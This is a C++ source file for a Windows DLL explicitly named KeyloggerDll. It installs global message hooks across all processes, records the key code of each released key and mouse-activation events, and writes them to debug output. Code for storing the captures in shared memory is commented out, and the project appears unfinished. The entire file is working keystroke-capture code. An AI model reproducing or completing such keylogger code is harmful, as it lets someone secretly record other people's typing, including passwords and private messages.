#include "stdafx.h"
#include "KeyloggerDll.h"

#include <sstream>

KeyloggerDll::KeyloggerDll(HMODULE hModule) :
_shm("lllol")
{
	this->_hModule = hModule;
	OutputDebugStringW(L"CTOR");
}

KeyloggerDll::~KeyloggerDll()
{
	//UnhookWindowsHookEx(_hook);
	OutputDebugStringW(L"Unhooked");
}

void	KeyloggerDll::setModuleHandle(HMODULE hModule)
{
	this->_hModule = hModule;
}

// Get singleton unique instance
//KeyloggerDll& KeyloggerDll::GetInstance()
//{
//	static KeyloggerDll instance;
//	return (instance);
//}

LRESULT CALLBACK KeyloggerDll::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSG *msg;
	if (nCode >= 0)
	{
		msg = (MSG*)lParam;
		if (msg->message == WM_KEYUP)
		{
			Data		data;

			data.t = KEYPRESS;
			data.data.key.keyCode = msg->wParam;
			//_shm.push(data);
			std::wostringstream out;
			out << " Key : " << msg->wParam;
			OutputDebugStringW(out.str().c_str());
		}
	}
	return CallNextHookEx(this->_postMsgHook, nCode, wParam, lParam);
}

LRESULT CALLBACK KeyloggerDll::CallWndProc(
	_In_  int nCode,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
	)
{
	if (nCode >= 0)
	{
		CWPSTRUCT	*cwp = (CWPSTRUCT*)lParam;
		DWORD		pid = GetCurrentProcessId();
		wchar_t		winName[128];

		GetWindowText(cwp->hwnd, winName, 128);

		std::wostringstream out;


		out << "[" << pid << "] : " << std::hex << cwp->message;
		//OutputDebugStringW(out.str().c_str());

		if (cwp->message == WM_MOUSEACTIVATE)
		{
			Data test;

			test.t = MOUSELOG;
			//_shm.push(test);
			//OutputDebugStringW(L"Kefefefwefewey pressed MYGL !");
			OutputDebugStringW(out.str().c_str());
		}
	}
	return CallNextHookEx(this->_getMsgHook, nCode, wParam, lParam);
}

int KeyloggerDll::loadHook()
{

	if (!(this->_getMsgHook = SetWindowsHookEx(WH_CALLWNDPROC, CallWndProcFn, _hModule, 0)))
	{
		MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
	}
	if (!(this->_postMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProcFn, _hModule, 0)))
	{
		MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
	}
	return 0;
}

void	KeyloggerDll::MessageLoop()
{
	MSG uMsg;
	while (GetMessage(&uMsg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&uMsg);
		DispatchMessage(&uMsg);
	}
}
